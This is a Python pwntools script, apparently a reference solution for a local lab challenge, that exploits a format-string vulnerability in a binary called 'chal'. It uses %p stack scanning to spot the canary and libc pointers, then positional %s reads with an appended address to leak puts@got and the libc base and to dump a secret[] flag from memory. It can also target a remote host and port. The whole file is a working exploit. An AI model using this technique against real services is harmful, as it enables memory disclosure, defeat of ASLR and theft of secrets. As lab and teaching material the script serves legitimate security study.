#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""lab_fmtstr_read —— 格式化字符串“读”原语参考 exploit

三步走（全部只用 printf 的读能力，没有任何 %n）：
  1. %p 扫描：从栈上认出 canary（低字节 0x00）和 __libc_start_main 返回地址（0x7f..）；
     同时用 "MARKMARK" 定位输入缓冲区在参数表里的索引 k；
  2. %<k+2>$s 读 puts@got → libc 指针（顺带说明 k+2 = buf[0x10] 那个槽）；
  3. %<k+2>$s 读 secret[]（.bss，程序从不打印）→ flag。

关键细节：目标地址必须放在格式串**后面**并且按 8 字节对齐 ——
printf(payload) 是 C 字符串，p64(addr) 里必然有 0x00，放在前面会把格式串直接截断，
后面的 %s 根本不会被执行；放在后面则 %s 先执行、输出完才遇到 0x00 停止。

用法：
    cd labs/lab_fmtstr_read
    make
    printf '__PWNED__{fmt_read_ok}\\n' > flag.txt
    python exp.py
    HOST=127.0.0.1 PORT=9999 python exp.py     # 远程（socat 起服务）
"""
import os
import sys

from pwn import *

context.arch = "amd64"
context.log_level = "info"

BIN = "./chal"
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "9999"))
MARK = b"MARKMARK"


def start():
    if HOST:
        return remote(HOST, PORT)
    return process(BIN)


def say(p, payload):
    """按协议发一条：u32 长度 + payload，收回 printf 的输出（不含换行和分隔符）"""
    p.send(p32(len(payload)) + payload)
    p.recvuntil(b"echo: ")
    return p.recvuntil(b"\n---\n")[: -len(b"\n---\n")]


def pick_hex(parts):
    out = []
    for part in parts:
        if part.startswith(b"0x"):
            try:
                out.append(int(part, 16))
            except ValueError:
                pass
    return out


def exploit():
    e = ELF(BIN, checksec=False)
    secret = e.symbols["secret"]
    got_puts = e.got["puts"]
    log.info("secret = %#x, puts@got = %#x", secret, got_puts)

    p = start()

    # ---- 1) %p 扫描 + 定位 buf 索引 -------------------------------------
    out = say(p, MARK + b".%p" * 0x30)
    parts = out.split(b".")
    idx = None
    for i, part in enumerate(parts):
        if part.strip().lower() == b"0x4b52414d4b52414d":  # "MARKMARK" 小端
            idx = i
            break
    if idx is None:
        raise SystemExit("[-] 没在栈上找到 MARKMARK，检查 chal 编译参数")
    log.success("buf 在 printf 参数表里的索引 k = %d", idx)

    vals = pick_hex(parts)
    stackptr = [v for v in vals if v >= 0x7F0000000000]
    # 本机 libc/ld 映射不一定落在 0x7f.. 段（实测 0x7d..），只按“高位非零且有页对齐意义”粗筛
    libcptr = [v for v in vals if 0x700000000000 <= v < 0x7F0000000000]
    canary = [v for v in vals if v & 0xFF == 0 and (v >> 40) != 0 and v < 0x700000000000]
    if canary:
        log.info("canary 候选 = %s（低字节 0x00，典型特征）",
                 ", ".join(hex(v) for v in canary[:3]))
    if libcptr:
        log.info("libc/ld 指针候选 = %s", ", ".join(hex(v) for v in libcptr[:3]))
    log.info("栈指针候选 = %s", ", ".join(hex(v) for v in stackptr[:3]))

    # ---- 2) %s 读 puts@got ----------------------------------------------
    payload = f"%{idx + 2}$s".encode().ljust(0x10, b"\x00") + p64(got_puts)
    leak = say(p, payload)[:8].ljust(8, b"\x00")
    puts_addr = u64(leak)
    log.success("puts@got 泄漏 = %#x", puts_addr)
    if puts_addr < 0x100000000:
        raise SystemExit("[-] 泄漏值不像指针，先 %p 检查栈布局")
    # 用本机 libc 的 puts 偏移做页对齐校验（lab 只在本机跑；找不到 libc 就跳过）
    try:
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
        off_puts = libc.symbols["puts"]
        base = puts_addr - off_puts
        if base & 0xFFF:
            raise SystemExit(f"[-] libc base {base:#x} 不是页对齐，泄漏可能错位")
        log.success("libc base = %#x（puts off = %#x）", base, off_puts)
    except FileNotFoundError:
        log.warning("找不到本机 libc.so.6，跳过页对齐校验")

    # ---- 3) %s 读 secret[] ----------------------------------------------
    payload = f"%{idx + 2}$s".encode().ljust(0x10, b"\x00") + p64(secret)
    data = say(p, payload)
    log.success("secret[] 内容 = %r", data)
    return data


if __name__ == "__main__":
    out = exploit()
    sys.stdout.buffer.write(out if out.endswith(b"\n") else out + b"\n")
    if b"__PWNED__" not in out:
        raise SystemExit("[-] 没读到 flag，检查 labs/lab_fmtstr_read/flag.txt")
    log.success("fmtstr read OK")
